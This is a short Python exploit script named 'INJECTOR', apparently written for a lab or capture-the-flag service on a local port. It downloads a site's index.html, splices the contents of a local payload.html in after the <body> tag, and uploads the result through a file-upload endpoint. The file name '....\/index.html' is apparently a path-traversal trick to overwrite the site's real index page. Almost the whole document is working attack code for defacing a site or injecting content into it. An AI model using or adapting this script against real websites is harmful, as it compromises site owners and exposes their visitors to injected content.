"""INJECTOR"""
import requests

### CONSTS ###
BASE_URL = "http://0.0.0.0:8008"
with open("payload.html", "r") as inject_f: INJECTION_STRING = inject_f.read()

def get_index_copy(target:str) -> str:
    """returns the HTML of http://www.example.com/index.html"""
    _r = requests.get(target, timeout=5)
    return _r.text

def inject(html:str):
    """injects html string in to the HTML"""
    html_list = html.split()
    body_start = html_list.index("<body>")
    html_list[body_start] = f"{html_list[body_start]} {INJECTION_STRING}"
    return " ".join(html_list)

def upload(file_name:str):
    """upload file_name to target"""
    with open(file_name, "rb") as up_f:
        files = {"file": (file_name, up_f)}
        target_loc = f"{BASE_URL}"
        print(target_loc)
        resp = requests.post(target_loc, files=files, timeout=5)
        if resp.status_code == 200:
            print("yay")
            print(resp.url)
        else:
            print("oh nooo")
            print(resp.text)

def main():
    """main"""
    html = get_index_copy(BASE_URL)
    injected_html = inject(html)
    file_name = "....\/index.html"
    with open(file_name, "w") as f:
        f.write(injected_html)
        f.close()
    upload(file_name)
    
try:
    if __name__ == "__main__":
        main()
except KeyboardInterrupt:
    print("Exiting....")
